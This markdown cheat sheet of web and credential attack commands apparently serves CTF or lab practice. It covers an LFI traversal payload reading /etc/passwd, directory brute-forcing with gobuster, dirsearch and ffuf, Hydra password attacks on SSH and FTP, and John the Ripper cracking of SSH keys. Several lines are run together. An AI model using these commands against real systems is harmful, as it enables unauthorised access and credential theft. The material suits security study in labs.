# Web

## Source
View source files

## Robots
Open robots.txt

## LFI
Try to open  ../../../../../etc/passwd
http://target/item?id=../../../../../etc/passwd

## Web path discovery


### Gobuster
```
gobuster dir -u http://$target -w /usr/share/dirb/wordlists/common.txt -t 100 -o $target_name.dir.txt
gobuster dir -u $target -w /usr/share/dirb/wordlists/common.txt -x .php,.txt,.html -t 100 -o $target_name.file.txt

```


### dirb
```
dirb $target
```

###  dirsearch

```
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip3 install -r requirements.txt
python3 dirsearch.py -u <URL> -e <EXTENSIONS>

Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]

python3 dirsearch.py -u $target -e php,html,txt port80

python3 dirsearch.py -e php,html,js -u https://target

python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist

```

## dirsearch recursive
python3 dirsearch.py -e php,html,js -u https://target -r


## ffuf
ffuf -c -w letters -u http://10.10.21.10 -H "User-Agent: FUZZ"




enum4linux $ip


## Hydra


hydra -l <username> -P /usr/share/wordlists

hydra -l <username> -P locks.txt 10.10.130.81 ssh

hydra -t 4 -l jan -P <rockyou.txt directory> ssh://<MACHINE IP>

hydra -f -I -vV -t 64 -l lin -P ./locks.txt $TARGET ssh

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.133.186



## rockyou
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gzwc -l /usr/share/wordlists/rockyou.txt
```

## ssh_key
```
chmod 600 ssh_key
ssh -i ssh_key username@$target
```
# Create some private key
ssh-keygen -t rsa -b 4096# Create encrypted zip
/usr/sbin/ssh2john ~/.ssh/id_rsa > id_rsa.hash



python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash


Cracking everything with John the Ripper
https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c



